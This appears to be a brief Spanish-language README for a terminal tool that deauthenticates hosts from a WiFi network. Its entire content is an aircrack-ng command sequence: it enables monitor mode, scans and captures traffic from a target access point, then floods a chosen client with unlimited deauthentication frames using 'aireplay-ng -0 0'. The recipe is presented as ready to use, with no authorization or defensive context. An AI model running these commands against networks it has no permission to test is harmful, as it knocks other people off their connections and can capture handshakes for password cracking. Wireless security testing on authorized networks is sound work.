# wifi-host
Aplicacion de terminal para deautenticar host de una red wifi

sudo pacman -S aircrack-ng

airmon-ng check
airmon-ng check kill

airmon-ng start INTERFACE
airmon-ng stop INTERFACE
  
1) airodump-ng INTERFACE
2) airodump-ng --bssid BSSID --channel CH --write Path INTERFACE
3) aireplay-ng -0 0 -a BSSID -c STATION INTERFACE
